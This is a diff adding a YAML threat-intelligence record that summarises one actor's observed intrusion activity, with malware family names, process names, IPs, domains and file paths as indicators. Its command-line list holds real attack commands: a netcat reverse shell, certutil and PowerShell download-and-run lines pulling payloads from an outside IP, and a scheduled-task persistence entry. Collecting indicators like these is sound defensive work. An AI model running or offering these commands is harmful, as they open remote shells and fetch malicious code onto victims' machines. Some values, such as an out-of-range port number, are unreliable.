@@ -1,0 +1,87 @@
+summary: A cyber threat report detailing observed activity and TTPs, including reconnaissance,
+  exploitation, persistence mechanisms, and post-exploitation activities.
+date: '2023-12-09'
+author: anon
+attribution: Unknown
+malware_families:
+- Villannet
+- Metasploit
+- Sliver
+- Linux Trojan Shell/Miner
+- weevely
+- Cobalt Strike
+TTPs:
+  processs:
+  - Meterpreter
+  - cmd.exe
+  - schtasks
+  - mimikatz.exe
+  - autominionlx.sh
+  - LinPEAS
+  - certutil.exe
+  - autominion-wx.cmd
+  - gost
+  - echo
+  - net user
+  - netcat
+  - help.exe
+  - xmrig
+  - whoami
+  - powershell
+  - Invoke-EnumerateLocalAdmin
+  - domainhostname
+  - svchost.exe
+  - ssh
+  - bare.exe
+  - ipconfig
+  commandline:
+  - processfwd add -R -p 89474 -l 4453 -L 192.169.6.122
+  - Meterpreter
+  - LinPEAS
+  - nc -e /bin/bash 104.200.67.3 1608 2> /dev/null
+  - certutil -urlcache * http://103.248.61.184/payload.dll
+  - Invoke-EnumerateLocalAdmin
+  - ssh -N -D 1080 [email protected]
+  - schtasks /create /tn \\Microsoft\\Windows\\TaskScheduler\\MyTask /tr \"C:\\Windows\\System32\\cmd.exe\"
+    /sc minute /mo 5
+  - ssh -N -D 1080 [email protected] -p 1080
+  - powershell -EncodedCommand IEx(New-Object System.Net.WebClient).DownloadString(\"http://103.248.61.184/payload.ps1\")
+  powershell:
+  - powershellintelmodule.ps1
+  - IEx(New-Object System.Net.WebClient).DownloadString(\"http://103.248.61.184/payload.ps1\")
+  scripting_engine: []
+  registry_keys: []
+  network_connections:
+  - port: '31337'
+    destination: 192.169.6.122
+  file_modifications: []
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes:
+  - md5: 0c5ede28df39341763d16961a118625d
+  ips:
+  - 45.56.162.100
+  - 192.169.6.122
+  - 104.200.67.3
+  - 166.62.10.138
+  - 146.88.26.221
+  - 202.70.80.119
+  - 103.248.61.184
+  - 43.230.203.164
+  - 103.174.104.51
+  domains:
+  - smilevolume[.]com
+  - apicalls[.]net
+  - vpnjantit[.]com
+  urls:
+  - http://192.169.6.122:6770/svchost.exe
+  - C:\\Windows\\Temp\\svchost.exe
+  - C:\\ProgramData\\Software\\svchost.exe
+  - C:\\ProgramData\\Software\\cmd.exe
+  - C:\\ProgramData\\Mozrilla\\bare.exe
+  - C:\\ProgramData\\Mozrilla\\adminlevel\\svchost.exe
+  - C:\\Users\\<user>\\AppData\\Local\\Temp\\help.exe
+reference: https://thedfirreport.com/2023/12/18/lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity/
+file_creation_date: May 09, 2025
